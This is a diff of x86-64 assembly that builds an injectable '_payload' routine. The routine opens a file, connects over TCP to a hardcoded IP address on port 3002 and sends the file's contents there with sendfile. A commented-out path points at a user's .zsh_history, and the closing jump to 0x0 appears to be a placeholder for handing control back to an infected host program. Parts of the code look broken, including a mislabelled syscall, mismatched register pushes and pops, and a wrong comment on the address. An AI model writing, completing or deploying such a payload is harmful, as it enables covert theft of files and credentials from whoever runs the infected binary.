@@ -1,8 +1,5 @@
 [BITS 64]
 
-global _payload
-; extern port, addr_ip
-
 %macro pushx 1-*
 %rep %0
 	push %1
@@ -17,89 +14,107 @@ global _payload
 %endrep
 %endmacro
 
-%macro POPS 1-*
-%rep %0
-	pop rax
-	%rotate 1
-%endrep
-%endmacro
-
 section .text
+global _payload
+global _payload_size
 
 _payload:
-	pushx rax, rdi, rsi, rdx, r10
-	
-	; Open the file
-	mov rax, 2					; syscall number for open
-	lea rdi, [rel FILEPATH]		; filename
-	mov rsi, 0					; flags (O_RDONLY)
-	syscall
-	cmp rax, -1
-	jl .clean
-	mov r12, rax
+	pushfq
+	pushx rsp, rax, rdi, rsi, rdx, r10, r12, 13
 
-	; stat the file
-	mov rax, 4					; syscall number for stat
-	lea rdi, [rel FILEPATH]		; filename
-	lea rsi, [rel STATBUFFER]	; stat buffer
+	mov rax, 1	;SYS_open
+	mov rdi, 1
+	lea rsi, [rel msg2]
+	mov rdx, 4
 	syscall
-	cmp rax, -1
-	je .clean
 
-.connect:
-	; Create the socket
-	mov rax, 41					; syscall number for socket
-	mov rdi, 2					; domain (AF_INET)
-	mov rsi, 1					; type (SOCK_STREAM)
-	mov rdx, 0					; protocol
-	syscall
-	cmp rax, -1
-	je .clean
-	mov r13, rax
+	jmp open
 
-	; Prepare sockaddr_in structure
-	mov word [CONNECT_BUFFER], 2          ; sin_family (AF_INET)
-	movzx rax, word [rel SERVER_PORT]
-	mov word [CONNECT_BUFFER + 2], ax ; sin_port
-	mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
-	mov dword [CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
-	
-	; Connect the socket
-	mov rax, 42						; syscall number for connect
-	mov rdi, r13					; socket file descriptor
-	lea rsi, [rel CONNECT_BUFFER]	; pointer to sockaddr_in
-	mov rdx, 16						; size of sockaddr_in
-	syscall
-	cmp rax, -1
-	je .clean
+msg db 'oui', 0x0a, 0
+msg2 db 'non', 0x0a, 0
+
+open:
+    ; Ouvrir le fichier
+    mov rax, 2				; SYS_open
+    lea rdi, [rel path]		; Chemin du fichier
+    mov rsi, 0				; O_RDONLY
+    syscall
+    test rax, rax
+    js exit					; Gestion de l'erreur
+
+    mov r12, rax ; Descripteur de fichier
+
+    ; Récupérer les métadonnées du fichier
+    mov rax, 4					; SYS_stat
+    lea rdi, [rel path]			; Chemin du fichier
+    lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
+    syscall
+    test rax, rax
+    js error_open			; Gestion de l'erreur
+
+    ; Créer la socket
+    mov rax, 41				; SYS_socket
+    mov rdi, 2				; AF_INET
+    mov rsi, 1				; SOCK_STREAM
+    mov rdx, 0
+    syscall
+    test rax, rax
+    js error_open			; Gestion de l'erreur
+
+	; Sauvegarder le descripteur de socket
+    mov r13, rax ; Descripteur de socket
+
+    ; Connecter au serveur
+    mov rax, 42					; SYS_connect
+    mov rdi, r13				; Descripteur de socket
+    lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
+    mov rdx, 16					; Taille de sockaddr_in
+    syscall
+    test rax, rax
+    js error_socket				; Gestion de l'erreur
 
 	; Send the file
-	mov rax, 40						; syscall number for sendfile
+	mov rax, 40						; SYS_sendfile
 	mov rdi, r13					; socket file descriptor
 	mov rsi, r12					; file descriptor
 	xor rdx, rdx					; offset (NULL)
-	mov r10, [rel STATBUFFER + 48]	; size
+	mov r10, [rel stat_buffer + 48]	; size
+	syscall
+    test rax, rax
+    js error_socket					; Gestion de l'erreur
+
+error_socket:
+    ; Gestion de l'erreur
+	; Fermer la socket
+    mov rax, 3 ; SYS_close
+    mov rdi, r13
+    syscall
+
+error_open:
+    ; Gestion de l'erreur
+	; Fermer le fichier
+    mov rax, 3 ; SYS_close
+    mov rdi, r12
 	syscall
 
-	jmp .clean
+exit:
+    ; Jump to the next instruction
+	pushx rsp, rax, rdi, rsi, rdx, r10, r12, 13
+	popfq
+	jmp 0x0
 
-.clean:
-	; Close the file
-	mov rax, 3					; syscall number for close
-	mov rdi, r12				; file descriptor
-	syscall
-
-	; Close the socket
-	mov rax, 3					; syscall number for close
-	mov rdi, r13				; file descriptor
-	syscall
-
-	popx rax, rdi, rsi, rdx, r10
-	; jmp     0x0
-	ret
-
-STATBUFFER		times 144 db 0
-CONNECT_BUFFER	times 16 db 0
-FILEPATH		times 1024 db 0
-SERVER_PORT		dd 0x0
-SERVER_ADDR		dw 0x0
+; section .data
+stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
+sockaddr_in:
+	; - sin_family: 2 octets
+	; - sin_port: 2 octets
+	; - sin_addr: 4 octets
+	; - sin_zero: 8 octets
+	dw 2                       ; sin_family (AF_INET)
+	dw 0x9210                  ; sin_port (3002 en hex)
+	dd 0x3fcbd755              ; sin_addr (INADDR_ANY)
+	times 8 db 0               ; sin_zero (8 octets de zéros)
+	; Taille totale: 16 octets
+path		times 1024 db 0	; Chemin du fichier
+; path		db '/home/maxence/.zsh_history', 0	; Chemin du fichier
+_payload_size dq $- _payload
